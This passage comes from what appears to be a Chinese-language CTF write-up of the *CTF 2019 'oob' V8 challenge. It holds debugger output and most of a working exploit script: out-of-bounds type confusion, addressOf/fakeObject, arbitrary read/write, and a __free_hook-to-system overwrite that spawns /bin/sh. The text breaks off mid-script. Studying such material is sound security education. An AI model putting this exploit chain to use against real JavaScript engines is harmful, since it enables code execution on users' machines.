class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x1ff245482d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x2009df486791</span> &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: <span class="number">0x0de30b5c3599</span> &lt;String[#<span class="number">5</span>]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x25166f041869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x1e6620dc6981</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x25166f051029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4804b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x2009df480449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#prototype: 0x2009df480529 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="number">0x0de30b5c4c79</span> &lt;Symbol: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x0de30b5c4f41</span> &lt;Symbol: Symbol.species&gt;: <span class="number">0x25166f050fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: <span class="number">0x25166f051069</span> &lt;JSFunction <span class="built_in">isArray</span> (sfi = <span class="number">0x2009df486829</span>)&gt; (<span class="keyword">const</span> data field <span class="number">1</span>) properties[<span class="number">1</span>]</span><br><span class="line">    <span class="meta">#from: 0x25166f0510a1 <span class="meta-string">&lt;JSFunction from (sfi = 0x2009df486879)&gt;</span> (const data field 2) properties[2]</span></span><br><span class="line">    <span class="meta">#of: 0x25166f0510d9 <span class="meta-string">&lt;JSFunction of (sfi = 0x2009df4868b1)&gt;</span> (const data field 3) properties[3]</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e6620dc6981</span></span><br><span class="line"><span class="number">0x1e6620dc6981</span>: [Code]</span><br><span class="line"> - map: <span class="number">0x0de30b5c0a31</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = ArrayConstructor</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x7ffc86ea2078</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Trampoline</span> (size = <span class="number">13</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c0</span>     <span class="number">0</span>  <span class="number">49b</span>a8087519805560000 REX.W movq r10,<span class="number">0x560598518780</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x1e6620dc69ca</span>     a  <span class="number">41f</span>fe2         jmp r10</span><br><span class="line"></span><br><span class="line"><span class="built_in">Instructions</span> (size = <span class="number">28</span>)</span><br><span class="line"><span class="number">0x560598518780</span>     <span class="number">0</span>  <span class="number">493955</span>d8       REX.W cmpq [r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value)),rdx</span><br><span class="line"><span class="number">0x560598518784</span>     <span class="number">4</span>  <span class="number">7405</span>           jz <span class="number">0x56059851878b</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x560598518786</span>     <span class="number">6</span>  <span class="number">488b</span>ca         REX.W movq rcx,rdx</span><br><span class="line"><span class="number">0x560598518789</span>     <span class="number">9</span>  eb03           jmp <span class="number">0x56059851878e</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56059851878b</span>     b  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x56059851878e</span>     e  <span class="number">498b</span>5dd8       REX.W movq rbx,[r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value))</span><br><span class="line"><span class="number">0x560598518792</span>    <span class="number">12</span>  <span class="number">488b</span>d1         REX.W movq rdx,rcx</span><br><span class="line"><span class="number">0x560598518795</span>    <span class="number">15</span>  e926000000     jmp <span class="number">0x5605985187c0</span>  (ArrayConstructorImpl)</span><br><span class="line"><span class="number">0x56059851879a</span>    <span class="number">1</span>a  <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x56059851879b</span>    <span class="number">1b</span>  <span class="number">90</span>             nop</span><br><span class="line"></span><br><span class="line"><span class="built_in">Safepoints</span> (size = <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">RelocInfo</span> (size = <span class="number">2</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c2</span>  off heap target</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1e6620dc6980</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1e6620dc6980</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1e6620dc6988</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1e6620dc6990</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1e6620dc6998</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1e6620dc69a0</span> —▸ <span class="number">0x2009df4916a9</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1e6620dc69a8</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1e6620dc69b0</span> ◂— sbb    al, <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1e6620dc69b8</span> ◂— <span class="keyword">and</span>    al, <span class="number">0</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│   <span class="number">0x1e6620dc69c0</span> ◂— movabs r10, <span class="number">0x560598518780</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│   <span class="number">0x1e6620dc69c8</span> ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│   <span class="number">0x1e6620dc69d0</span> ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│   <span class="number">0x1e6620dc69e0</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│   <span class="number">0x1e6620dc69e8</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│   <span class="number">0x1e6620dc69f0</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│   <span class="number">0x1e6620dc69f8</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│   <span class="number">0x1e6620dc6a00</span> —▸ <span class="number">0x2009df4916c1</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│   <span class="number">0x1e6620dc6a08</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│   <span class="number">0x1e6620dc6a10</span> ◂— mov    byte ptr [rcx], al</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│   <span class="number">0x1e6620dc6a18</span> ◂— lahf</span><br><span class="line"></span><br><span class="line"><span class="comment">//在偏移0x40的位置取到程序地址空间地址</span></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x560598518780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x560597bc9000</span>     <span class="number">0x5605987a1000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编写泄露地址空间地址代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>gdb执行如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc1.js</span><br><span class="line">...</span><br><span class="line"><span class="number">0x2583cc70fa41</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] leak from: <span class="number">0x000013eba5410ef0</span>: <span class="number">0x000015e8b1dc6981</span></span><br><span class="line">[*] leak from: <span class="number">0x000015e8b1dc69c2</span>: <span class="number">0x00005626808ca780</span></span><br><span class="line">[*] find libc leak_d8_addr: <span class="number">0x00005626808ca780</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00005626808ca780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x56267ff7b000</span>     <span class="number">0x562680b53000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br></pre></td></tr></table></figure>

<h3 id="计算程序基址以及got表各函数地址"><a href="#计算程序基址以及got表各函数地址" class="headerlink" title="计算程序基址以及got表各函数地址"></a>计算程序基址以及got表各函数地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr)); </span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(libc_free_hook_addr, libc_system_addr); </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>下面逐个进行讲解</p>
<h4 id="获取d8-base-addr"><a href="#获取d8-base-addr" class="headerlink" title="获取d8_base_addr"></a>获取d8_base_addr</h4><p>通过下面两张图，可以看到我们泄露的地址为0x0000559f4ba96780，而应用程序的基地址为0x559f4aace000，这样他们的差值就为0xfc8780</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104201643280.png" alt="image-20210104201643280"></p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104201717162.png" alt="image-20210104201717162"></p>
<h4 id="获取d8-got-libc-start-main-addr"><a href="#获取d8-got-libc-start-main-addr" class="headerlink" title="获取d8_got_libc_start_main_addr"></a>获取d8_got_libc_start_main_addr</h4><p>ida查看.got的偏移，这里是0x12a47b0</p>
<h4 id="获取libc-start-main-addr"><a href="#获取libc-start-main-addr" class="headerlink" title="获取libc_start_main_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104201218775.png" alt="image-20210104201218775">获取libc_start_main_addr</h4><p><img src="/2021/04/21/starctf2019-oob/image-20210104201103483.png" alt="image-20210104201103483"></p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104201129304.png" alt="image-20210104201129304"></p>
<h4 id="获取libc-base-addr"><a href="#获取libc-base-addr" class="headerlink" title="获取libc_base_addr"></a>获取libc_base_addr</h4><p>libc的基址可以通过泄露的libc_start_main与偏移进行计算，我们在此次执行中可以知道0x00007f6e88df3fc0是libc_start_main在libc中的地址，0x7f6e88dcd000是libc基址，所以这里的偏移为0x26fc0</p>
<h4 id="获取libc-system-addr和libc-free-hook-addr"><a href="#获取libc-system-addr和libc-free-hook-addr" class="headerlink" title="获取libc_system_addr和libc_free_hook_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104202359104.png" alt="image-20210104202359104">获取libc_system_addr和libc_free_hook_addr</h4><p>ida查看下libc文件，可以看出__libc_start_main确实是在libc基址偏移0x26fc0</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104202851003.png" alt="image-20210104202851003"></p>
<p>所以我们可以直接通过查看ida来确定system和free_hook的偏移，可以看出来分别为0x55410，0x1eeb28</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104203218607.png" alt="image-20210104203218607"></p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210105091543768.png" alt="image-20210105091543768"></p>
<p>也可以通过gdb中泄露函数或者全局变量的地址，再通过与libc基址相减，即可得到相对应的偏移</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210105092417427.png" alt="image-20210105092417427"></p>
<p>最后申请一个变量在进行释放，触发free操作</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210105092756824.png" alt="image-20210105092756824"></p>
<p>也可以发送弹出计算器的命令</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00 </span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line"> 	get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line"> 	get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line"> 	get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/21/starctf2019-oob/image-20210105093339083.png" alt="image-20210105093339083"></p>
<h3 id="完整exp如下-1"><a href="#完整exp如下-1" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64_dataview</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(data), <span class="literal">true</span>);</span><br><span class="line">   <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780n</span>;							<span class="comment">//本人的libc版本是libc-2.31.so，具体的偏移需要根据自己的libc版本来确定</span></span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x00000000001EEB28n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//write64(libc_free_hook_addr, libc_system_addr);</span></span><br><span class="line">write64_dataview(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span 